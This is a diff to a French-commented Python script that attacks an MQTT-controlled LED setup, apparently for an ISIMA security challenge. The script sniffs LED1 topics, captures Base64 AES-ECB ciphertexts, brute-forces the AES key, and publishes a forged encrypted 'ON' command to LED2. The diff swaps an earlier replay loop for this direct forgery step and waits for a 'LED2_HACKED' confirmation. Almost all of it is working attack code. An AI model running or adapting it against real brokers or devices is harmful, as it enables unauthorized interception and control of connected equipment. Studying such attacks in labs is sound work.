@@ -19,7 +19,8 @@ collected_data = {
     'secrets': set(),
     'groupes': set(),
     'ciphertexts': [],
-    'topic_to_cipher': {}
+    'topic_to_cipher': {},
+    'led1_topics': []
 }
 
 # Variables globales pour la clé trouvée
@@ -203,6 +204,9 @@ def on_message(client, userdata, msg):
     if "LED1" not in msg.topic:
         return
     
+    # Stocker le topic LED1 pour plus tard
+    collected_data['led1_topics'].append(msg.topic)
+    
     # Décoder le payload
     try:
         decoded = DecodeBase64(msg.payload)
@@ -211,36 +215,42 @@ def on_message(client, userdata, msg):
         collected_data['ciphertexts'].append(decoded)
         collected_data['topic_to_cipher'][msg.topic] = decoded
         
-        # Si on a déjà la clé, déchiffrer et renvoyer
-        if cle_aes_trouvee is not None and secret_trouve is not None:
-            try:
-                plaintext = DecodeAES_ECB(decoded, cle_aes_trouvee)
-                plaintext_str = plaintext.decode('utf-8', errors='ignore').strip()
-                print(f"   🔓 Message clair: '{plaintext_str}'")
-                
-                # Construire le topic de réponse
-                topic_reponse = msg.topic.replace("LED1", "LED2")
-                # Remplacer le SECRET dans le topic
-                for part in parties:
-                    if part.startswith("SECRET_"):
-                        topic_reponse = topic_reponse.replace(part, secret_trouve)
-                        break
-                
-                # Chiffrer et encoder le même message
-                ciphertext_reponse = EncodeAES_ECB(plaintext_str, cle_aes_trouvee)
-                payload_reponse = EncodeBase64(ciphertext_reponse)
-                
-                print(f"   📤 Publication sur: {topic_reponse}")
-                client.publish(topic_reponse, payload_reponse, qos=0)
-                
-            except Exception as e:
-                print(f"   ⚠️  Erreur replay: {e}")
-        
     except Exception as e:
         print(f"   ⚠️  Erreur décodage: {e}")
 
 def on_publish(client, userdata, mid):
     print(f"   ✓ Message publié (mid: {mid})")
+
+# ============================================================================
+# FONCTION POUR ENVOYER "ON" SUR LED2
+# ============================================================================
+
+def envoyer_on_led2(client, secret, cle_aes):
+    """Envoie ON chiffré en AES puis encodé en Base64 sur LED2"""
+    
+    # Construire le topic LED2
+    topic_led2 = f"/ISIMA/{secret}/CHALLENGE_2/DEFI_1/{GROUPE}/LEDS/LED2"
+    
+    print("\n" + "="*70)
+    print("🚀 ENVOI DU MESSAGE FINAL")
+    print("="*70)
+    print(f"📍 Topic: {topic_led2}")
+    print(f"📝 Message: ON")
+    print(f"🔑 Clé AES: {cle_aes.hex()}")
+    
+    # Chiffrer "ON" avec AES
+    ciphertext = EncodeAES_ECB("ON", cle_aes)
+    print(f"🔒 Chiffré (hex): {ciphertext.hex()}")
+    
+    # Encoder en Base64
+    payload = EncodeBase64(ciphertext)
+    print(f"📦 Base64: {payload.decode('ascii')}")
+    
+    # Publier
+    result = client.publish(topic_led2, payload, qos=0)
+    print(f"📤 Publication... (mid: {result.mid})")
+    
+    return topic_led2
 
 # ============================================================================
 # SCRIPT PRINCIPAL
@@ -280,6 +290,11 @@ try:
     print(f"✓ SECRETs détectés: {collected_data['secrets']}")
     print(f"✓ Groupes détectés: {collected_data['groupes']}")
     print(f"✓ Messages capturés: {len(collected_data['ciphertexts'])}")
+    print(f"✓ Topics LED1 trouvés: {len(collected_data['led1_topics'])}")
+    
+    if not secret_trouve and collected_data['secrets']:
+        secret_trouve = list(collected_data['secrets'])[0]
+        print(f"🔐 Utilisation du SECRET: {secret_trouve}")
     
     if collected_data['ciphertexts']:
         # Trouver le message le plus fréquent (probablement "OFF")
@@ -293,23 +308,33 @@ try:
         # Brute force
         cle_aes_trouvee = brute_force_aes(most_common_cipher)
         
-        if cle_aes_trouvee:
-            print("\n" + "="*70)
-            print("🚀 PHASE 3: Attaque active - Replay des messages")
-            print("="*70)
-            print(f"🔑 Clé AES: {cle_aes_trouvee.hex()}")
-            if secret_trouve:
-                print(f"🔐 SECRET: {secret_trouve}")
-            print("\n⏳ Écoute et replay en cours...")
+        if cle_aes_trouvee and secret_trouve:
+            print("\n✅ Clé et SECRET trouvés !")
             
-            # Continuer à écouter et rejouer les messages
-            while not client.hacked:
+            # Phase 3: Envoyer ON sur LED2
+            topic_utilise = envoyer_on_led2(client, secret_trouve, cle_aes_trouvee)
+            
+            # Attendre la confirmation
+            print("\n⏳ Attente de la confirmation (LED2_HACKED)...")
+            timeout = 10
+            elapsed = 0
+            while not client.hacked and elapsed < timeout:
                 time.sleep(0.5)
+                elapsed += 0.5
                 print(".", end="", flush=True)
-        else:
+            
+            if client.hacked:
+                print("\n\n🎉🎉🎉 SUCCÈS ! CHALLENGE COMPLÉTÉ ! 🎉🎉🎉")
+            else:
+                print(f"\n\n⚠️  Pas de confirmation reçue après {timeout}s")
+                print("💡 Le message a été envoyé. Vérifie manuellement ou réessaie.")
+                
+        elif not cle_aes_trouvee:
             print("\n❌ Impossible de trouver la clé. Essaie:")
             print("   - D'écouter plus longtemps")
             print("   - D'étendre la plage de brute force")
+        elif not secret_trouve:
+            print("\n❌ SECRET non trouvé. Vérifie les topics MQTT.")
     else:
         print("\n⚠️  Aucun message capturé. Vérifie la connexion MQTT.")
 
@@ -318,6 +343,11 @@ except ConnectionRefusedError:
 
 except KeyboardInterrupt:
     print("\n\n⏹️  Arrêt demandé par l'utilisateur")
+
+except Exception as e:
+    print(f"\n❌ Erreur inattendue: {e}")
+    import traceback
+    traceback.print_exc()
 
 finally:
     client.loop_stop()
